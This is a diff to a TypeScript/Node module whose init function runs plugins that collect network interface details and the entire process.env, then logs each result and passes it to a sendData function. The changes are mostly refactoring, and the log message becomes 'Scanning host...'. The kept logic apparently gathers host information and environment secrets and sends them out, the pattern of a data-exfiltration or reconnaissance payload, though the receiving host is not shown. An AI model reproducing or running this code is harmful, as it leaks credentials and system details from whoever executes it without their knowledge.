@@ -26,7 +26,7 @@ function getEnvInfo(): EnvDetails {
   return process.env;
 };
 
-const plugins: CustomPlugin[] = [
+const plugins: Array<CustomPlugin> = [
   {
       key: "networkInterfaces",
       plugin: getNetworkInfo
@@ -51,12 +51,11 @@ function runPlugin({ key, plugin }: CustomPlugin): NodeJS.Dict<CustomPlugin> {
   }
 }
 
-console.log("Running safe...");
-
 export default function init() {
+  console.log("Scanning host...");
   plugins.forEach(plugin => {
-    let data = runPlugin(plugin);
-    let postData = JSON.stringify(data, null, 2);
+    const gatheredInfo = runPlugin(plugin);
+    const postData = JSON.stringify(gatheredInfo, null, 2);
     console.log(`Data from ${plugin.key} is: ${postData}`);
     sendData(postData, plugin.key, generateRandomId());
   });
